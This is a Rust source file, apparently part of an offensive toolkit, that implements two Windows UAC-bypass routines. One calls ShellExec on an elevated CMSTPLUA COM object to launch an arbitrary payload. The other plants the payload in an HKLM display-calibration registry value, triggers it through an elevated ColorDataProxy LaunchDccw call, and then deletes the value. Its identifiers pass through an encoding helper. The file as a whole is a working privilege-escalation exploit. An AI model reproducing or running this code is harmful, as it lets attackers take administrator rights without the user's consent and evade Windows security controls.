use std::ptr::null_mut;

use anyhow::*;
use winapi::{
    shared::{
        winerror::{FAILED, S_OK},
        wtypesbase::CLSCTX_LOCAL_SERVER,
    },
    um::{
        combaseapi::{CoInitializeEx, CoUninitialize},
        objbase::COINIT_APARTMENTTHREADED,
        shellapi::SEE_MASK_DEFAULT,
        winuser::SW_SHOW,
    },
};
use winreg::enums::HKEY_LOCAL_MACHINE;

use crate::com_utils::*;
use crate::global::*;
use crate::interface::*;
use crate::shared::*;

#[allow(non_snake_case)]
pub fn CMLuaUtilShellExec(payload: impl Into<String>, params: *const u16) -> Result<()> {
    unsafe {
        let payload = payload.into();
        let mut p_CMLuaUtil: *mut ICMLuaUtil::ICMLuaUtil = null_mut();

        loop {
            if is_approved_interface(e(T_CLSID_CMSTPLUA).as_mut_ptr()).is_err() {
                break;
            }

            crate::shared::check(CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED));

            let hr = crate::com_utils::alloc_elevated_object(
                T_CLSID_CMSTPLUA,
                IID_ICMLuaUtil,
                CLSCTX_LOCAL_SERVER,
                &mut p_CMLuaUtil as *mut _ as *mut _,
            )?;

            if hr != S_OK {
                bail!("alloc_elevated_object failed.");
            }

            (*p_CMLuaUtil).ShellExec(
                e(&payload).as_ptr(),
                params,
                null_mut(),
                SEE_MASK_DEFAULT,
                SW_SHOW as _,
            );

            break;
        }

        if !p_CMLuaUtil.is_null() {
            (*p_CMLuaUtil).Release();
        }

        CoUninitialize();

        Ok(())
    }
}

#[allow(non_snake_case)]
pub fn DccwCOM(payload: impl Into<String>) -> Result<()> {
    unsafe {
        let payload = payload.into();
        let mut p_CMLuaUtil: *mut ICMLuaUtil::ICMLuaUtil = null_mut();
        let mut p_IColorDataProxy: *mut IColorDataProxy::IColorDataProxy = null_mut();

        loop {
            if is_approved_interface(e(T_CLSID_CMSTPLUA).as_mut_ptr()).is_err() {
                break;
            }

            if is_approved_interface(e(T_CLSID_ColorDataProxy).as_mut_ptr()).is_err() {
                break;
            }

            crate::shared::check(CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED));

            let hr = crate::com_utils::alloc_elevated_object(
                T_CLSID_CMSTPLUA,
                IID_ICMLuaUtil,
                CLSCTX_LOCAL_SERVER,
                &mut p_CMLuaUtil as *mut _ as *mut _,
            )?;

            if hr != S_OK {
                bail!("alloc_elevated_object failed.");
            }

            let r = (*p_CMLuaUtil).SetRegistryStringValue(
                HKEY_LOCAL_MACHINE,
                e(T_DISPLAY_CALIBRATION).as_ptr(),
                e(T_CALIBRATOR_VALUE).as_ptr(),
                e(&payload).as_ptr(),
            );

            if FAILED(r) {
                bail!("SetRegistryStringValue failed.");
            }

            let hr = crate::com_utils::alloc_elevated_object(
                T_CLSID_ColorDataProxy,
                IID_IColorDataProxy,
                CLSCTX_LOCAL_SERVER,
                &mut p_IColorDataProxy as *mut _ as *mut _,
            )?;

            if hr != S_OK {
                bail!("alloc_elevated_object failed.");
            }

            let r = (*p_IColorDataProxy).LaunchDccw(0 as _);

            if FAILED(r) {
                bail!("LaunchDccw failed.");
            }

            let r = (*p_CMLuaUtil).DeleteRegistryStringValue(
                HKEY_LOCAL_MACHINE,
                e(T_DISPLAY_CALIBRATION).as_ptr(),
                e(T_CALIBRATOR_VALUE).as_ptr(),
            );

            if FAILED(r) {
                bail!("DeleteRegistryStringValue failed.");
            }

            break;
        }

        if !p_CMLuaUtil.is_null() {
            (*p_CMLuaUtil).Release();
        }

        if !p_IColorDataProxy.is_null() {
            (*p_IColorDataProxy).Release();
        }

        CoUninitialize();

        Ok(())
    }
}
